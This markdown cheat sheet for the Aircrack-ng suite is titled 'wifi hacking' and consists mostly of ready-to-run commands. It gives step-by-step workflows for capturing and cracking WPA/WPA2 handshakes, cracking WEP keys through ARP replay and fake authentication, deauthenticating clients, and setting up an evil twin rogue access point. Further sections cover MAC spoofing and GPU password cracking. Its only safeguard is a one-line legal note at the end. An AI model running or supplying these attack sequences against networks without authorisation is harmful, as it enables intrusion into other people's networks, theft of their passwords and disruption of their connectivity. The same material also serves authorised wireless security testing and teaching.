# Aircrack-ng - wifi hacking

A comprehensive suite of tools for assessing WiFi network security and performing penetration testing on wireless networks.

---

## Installation

### Ubuntu/Debian/Kali Linux
```bash
# Update package lists
sudo apt update

# Install Aircrack-ng suite
sudo apt install aircrack-ng -y

# Verify installation
aircrack-ng --help
```

### From Source (Latest Version)
```bash
# Install dependencies
sudo apt install build-essential autoconf automake libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev ethtool shtool rfkill zlib1g-dev libpcap-dev libsqlite3-dev libpcre3-dev libhwloc-dev libcmocka-dev hostapd wpasupplicant tcpdump screen iw usbutils

# Clone repository
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng

# Build and install
autoreconf -i
./configure --with-experimental
make
sudo make install
sudo ldconfig
```

---

## Prerequisites & Setup

### 1. Check Wireless Interface
```bash
# List all network interfaces
iwconfig

# Check wireless interface details
sudo airmon-ng
```

### 2. Kill Conflicting Processes
```bash
# Automatically kill interfering processes
sudo airmon-ng check kill

# Manual process termination (if needed)
sudo killall wpa_supplicant dhclient NetworkManager
```

### 3. Enable Monitor Mode
```bash
# Start monitor mode on wlan0
sudo airmon-ng start wlan0

# Verify monitor mode (should show wlan0mon)
iwconfig

# Check monitor interface
sudo airmon-ng
```

### 4. Set Optimal Channel
```bash
# Set specific channel (e.g., channel 6)
sudo iwconfig wlan0mon channel 6
```

---

## Core Components

### 1. airmon-ng - Monitor Mode Management

**Purpose:** Enable/disable monitor mode on wireless interfaces.

#### Basic Commands
```bash
# Check for wireless interfaces and their status
sudo airmon-ng

# Enable monitor mode
sudo airmon-ng start wlan0

# Enable monitor mode on specific channel
sudo airmon-ng start wlan0 6

# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Check and kill interfering processes
sudo airmon-ng check kill
```

#### Understanding Output
- **Interface:** Physical wireless adapter (wlan0, wlan1)
- **Chipset:** Wireless card chipset
- **Driver:** Kernel driver in use
- **Monitor Mode:** Status (enabled/disabled)

---

### 2. airodump-ng - Packet Capture & Network Scanner

**Purpose:** Capture packets and discover wireless networks.

#### Basic Network Scanning
```bash
# Scan all channels and networks
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng -c 6 wlan0mon

# Scan specific band (2.4GHz only)
sudo airodump-ng --band bg wlan0mon

# Scan 5GHz band
sudo airodump-ng --band a wlan0mon

# Show only WPA2 networks
sudo airodump-ng --encrypt WPA2 wlan0mon
```

#### Targeted Capture (Handshake Capture)
```bash
# Capture from specific network (replace BSSID and channel)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Capture with better output formatting
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --output-format pcap wlan0mon

# Capture only handshakes (ignore other packets)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --output-format pcap,csv wlan0mon
```

#### Advanced Options
```bash
# Write IVs only (WEP cracking)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture --ivs wlan0mon

# Show manufacturer from OUI
sudo airodump-ng --manufacturer wlan0mon

# Update display every 1 second
sudo airodump-ng --berlin 1 wlan0mon

# Capture specific client
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -d CLIENT:MAC:HERE -w client_capture wlan0mon
```

#### Understanding Output
- **BSSID:** MAC address of access point
- **PWR:** Signal strength (-30 is stronger than -70)
- **Beacons:** Announcement packets from AP
- **#Data:** Data packets captured
- **CH:** Channel number
- **ENC:** Encryption type (WEP/WPA/WPA2/WPA3)
- **ESSID:** Network name (SSID)
- **STATION:** Connected client MAC addresses

---

### 3. aireplay-ng - Traffic Generation & Injection

**Purpose:** Generate traffic and perform injection attacks.

#### Test Injection Capability
```bash
# Test if your card supports injection
sudo aireplay-ng --test wlan0mon

# Test injection on specific AP
sudo aireplay-ng --test wlan0 -a AA:BB:CC:DD:EE:FF
```

#### Deauthentication Attack
```bash
# Deauth all clients from AP (5 packets)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client (unlimited)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:HERE wlan0mon

# Single deauth packet (stealthy)
sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:HERE wlan0mon
```

#### Fake Authentication (WEP)
```bash
# Fake authentication with AP
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h YOUR:CARD:MAC wlan0mon

# Fake auth with timing
sudo aireplay-ng -1 6000 -o 1 -q 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

#### ARP Replay Attack (WEP)
```bash
# ARP request replay attack
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h YOUR:CARD:MAC wlan0mon

# Fast ARP replay
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h YOUR:CARD:MAC -x 1000 wlan0mon
```

#### Interactive Packet Replay
```bash
# Interactive frame selection
sudo aireplay-ng -2 -b AA:BB:CC:DD:EE:FF -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon
```

#### Fragmentation Attack (WEP)
```bash
# Get PRGA XOR keystream
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h YOUR:CARD:MAC wlan0mon
```

#### ChopChop Attack (WEP)
```bash
# Decrypt WEP packet
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h YOUR:CARD:MAC wlan0mon
```

---

### 4. aircrack-ng - Password Cracking

**Purpose:** Crack WEP/WPA/WPA2 encryption keys.

#### WEP Cracking
```bash
# Crack WEP key (automatic)
sudo aircrack-ng capture-01.cap

# Crack 128-bit WEP
sudo aircrack-ng -n 128 capture-01.cap

# Use specific BSSID
sudo aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
```

#### WPA/WPA2 Dictionary Attack
```bash
# Basic dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Attack specific BSSID
sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Show only the key (quiet mode)
sudo aircrack-ng -w wordlist.txt -q capture-01.cap

# Use ESSID instead of BSSID
sudo aircrack-ng -w wordlist.txt -e "NetworkName" capture-01.cap
```

#### Multiple Capture Files
```bash
# Crack using multiple capture files
sudo aircrack-ng -w wordlist.txt capture-*.cap

# Specify files explicitly
sudo aircrack-ng -w wordlist.txt capture-01.cap capture-02.cap capture-03.cap
```

---

### 5. airdecap-ng - Packet Decryption

**Purpose:** Decrypt captured packets with known key.

```bash
# Decrypt WEP
sudo airdecap-ng -w 1234567890ABCDEF1234567890 capture-01.cap

# Decrypt WPA/WPA2
sudo airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# Decrypt specific BSSID
sudo airdecap-ng -b AA:BB:CC:DD:EE:FF -e "NetworkName" -p "password" capture-01.cap
```

---

### 6. airbase-ng - Rogue Access Point

**Purpose:** Create fake access points for MITM attacks.

```bash
# Create open fake AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Create WPA2 fake AP
sudo airbase-ng -e "FreeWiFi" -c 6 -W 1 -Z 4 wlan0mon

# Evil twin attack
sudo airbase-ng -a AA:BB:CC:DD:EE:FF -e "TargetNetwork" -c 6 wlan0mon
```

---

### 7. packetforge-ng - Custom Packet Creation

**Purpose:** Create custom injection packets.

```bash
# Create ARP request
sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h YOUR:CARD:MAC -k 255.255.255.255 -l 192.168.1.100 -y fragment-*.xor -w arp-request

# Create UDP packet
sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h YOUR:CARD:MAC -k 255.255.255.255 -l 192.168.1.100 -t 1 -w udp-packet
```

---

### 8. airdecloak-ng - Remove WEP Cloaking

**Purpose:** Remove WEP cloaking from capture files.

```bash
# Remove cloaking
sudo airdecloak-ng -i capture-01.cap --bssid AA:BB:CC:DD:EE:FF
```

---

### 9. airserv-ng - Wireless Card Server

**Purpose:** Allow remote access to wireless card.

```bash
# Start server
sudo airserv-ng -d wlan0mon -p 666 -c 6

# Connect remotely
sudo airodump-ng -i 127.0.0.1:666 wlan0mon
```

---

## Complete Attack Workflows

### Workflow 1: WPA/WPA2 Handshake Capture & Crack

#### Step 1: Preparation
```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
```

#### Step 2: Reconnaissance
```bash
# Scan for networks (Note the BSSID, channel, and ESSID)
sudo airodump-ng wlan0mon

# Look for targets with:
# - Good signal strength (PWR closer to -30)
# - Connected clients (shown in STATION column)
# - WPA2 encryption
```

#### Step 3: Capture Handshake
```bash
# Terminal 1: Start capturing
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Terminal 2: Force handshake (deauth client)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:HERE wlan0mon

# Watch Terminal 1 for "WPA handshake: AA:BB:CC:DD:EE:FF" message
```

#### Step 4: Verify Handshake
```bash
# Check if handshake was captured
sudo aircrack-ng handshake-01.cap

# Should show "1 handshake" in output
```

#### Step 5: Crack Password
```bash
# Using rockyou wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Using custom wordlist
sudo aircrack-ng -w /path/to/custom-wordlist.txt handshake-01.cap
```

#### Step 6: Cleanup
```bash
# Disable monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl start NetworkManager
```

---

### Workflow 2: WEP Key Cracking

#### Step 1: Setup
```bash
# Kill processes and enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

#### Step 2: Locate Target
```bash
# Find WEP networks
sudo airodump-ng --encrypt WEP wlan0mon
```

#### Step 3: Capture IVs
```bash
# Terminal 1: Capture packets
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_crack --ivs wlan0mon

# Goal: Capture 20,000+ IVs for 64-bit WEP
# Goal: Capture 40,000+ IVs for 128-bit WEP
```

#### Step 4: Accelerate IV Collection (Fake Auth)
```bash
# Terminal 2: Fake authenticate
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h YOUR:CARD:MAC wlan0mon

# Wait for "Association successful" message
```

#### Step 5: ARP Replay Attack
```bash
# Terminal 3: Generate traffic
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h YOUR:CARD:MAC wlan0mon

# Watch #Data column in Terminal 1 increase rapidly
```

#### Step 6: Crack WEP Key
```bash
# Terminal 4: Crack (can start before reaching IV goal)
sudo aircrack-ng wep_crack-01.ivs

# Or for 128-bit
sudo aircrack-ng -n 128 wep_crack-01.ivs
```

#### Step 7: Test Key
```bash
# Decrypt captured packets
sudo airdecap-ng -w CRACKED:KEY:HERE wep_crack-01.cap
```

---

### Workflow 3: Evil Twin Attack (Advanced)

#### Step 1: Setup
```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Create fake AP with same ESSID
sudo airbase-ng -e "TargetNetwork" -c 6 -a AA:BB:CC:DD:EE:FF wlan0mon
```

#### Step 2: Setup Network Bridge
```bash
# Create interface
sudo ifconfig at0 up
sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0

# Enable IP forwarding
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
```

#### Step 3: DHCP Server
```bash
# Install DHCP server
sudo apt install isc-dhcp-server

# Configure and start (configuration needed)
sudo dhcpd -cf /etc/dhcp/dhcpd.conf at0
```

#### Step 4: Deauth Original AP
```bash
# Force clients to disconnect
sudo aireplay-ng -0 0 -a REAL:AP:MAC wlan0mon
```

---

## Advanced Techniques

### Hidden SSID Discovery
```bash
# Capture beacon frames
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Deauth client to reveal SSID
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:HERE wlan0mon
```

### MAC Address Spoofing
```bash
# Disable interface
sudo ifconfig wlan0mon down

# Change MAC
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0mon

# Enable interface
sudo ifconfig wlan0mon up
```

### Crunch Wordlist Generation
```bash
# Install crunch
sudo apt install crunch

# Generate 8-character numeric wordlist
crunch 8 8 0123456789 -o /tmp/numeric_wordlist.txt

# Generate with pattern (@ = lowercase, , = uppercase, % = numbers)
crunch 8 8 -t @@@@%%%% -o /tmp/pattern_wordlist.txt
```

### John the Ripper with Aircrack
```bash
# Convert capture to John format
sudo aircrack-ng capture-01.cap -J john_format

# Use John to crack
john --wordlist=/usr/share/wordlists/rockyou.txt john_format.hccap
```

### Pyrit GPU Acceleration
```bash
# Install pyrit
sudo apt install pyrit

# Import capture
pyrit -r capture-01.cap analyze

# Crack with GPU
pyrit -r capture-01.cap -i /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF attack_passthrough
```

### Hashcat for WPA/WPA2
```bash
# Convert to hashcat format
sudo aircrack-ng capture-01.cap -J hashcat_format

# Crack with hashcat
hashcat -m 2500 hashcat_format.hccap /usr/share/wordlists/rockyou.txt
```

---

## Troubleshooting

### Issue: Monitor Mode Won't Enable
```bash
# Check for conflicts
sudo airmon-ng check

# Kill all conflicts
sudo airmon-ng check kill

# Restart network interface
sudo ifconfig wlan0 down
sudo ifconfig wlan0 up
sudo airmon-ng start wlan0
```

### Issue: No Injection Support
```bash
# Test injection
sudo aireplay-ng --test wlan0mon

# Check driver
sudo airmon-ng

# May need to install proper drivers or use external adapter
```

### Issue: "Fixed channel wlan0mon: -1"
```bash
# Manually set channel
sudo iwconfig wlan0mon channel 6

# If still fails, restart monitor mode
sudo airmon-ng stop wlan0mon
sudo airmon-ng start wlan0 6
```

### Issue: Handshake Not Capturing
```bash
# Verify client is connected
sudo airodump-ng wlan0mon

# Try more aggressive deauth
sudo aireplay-ng -0 20 -a AA:BB:CC:DD:EE:FF wlan0mon

# Ensure correct channel
sudo iwconfig wlan0mon channel X
```

### Issue: Slow Cracking Speed
```bash
# Use GPU acceleration (hashcat/pyrit)
# Use cloud cracking services
# Create targeted wordlist
# Use rainbow tables
```

---

## Legal & Ethical Guidelines

**ONLY test networks you own or have explicit written permission to assess.**
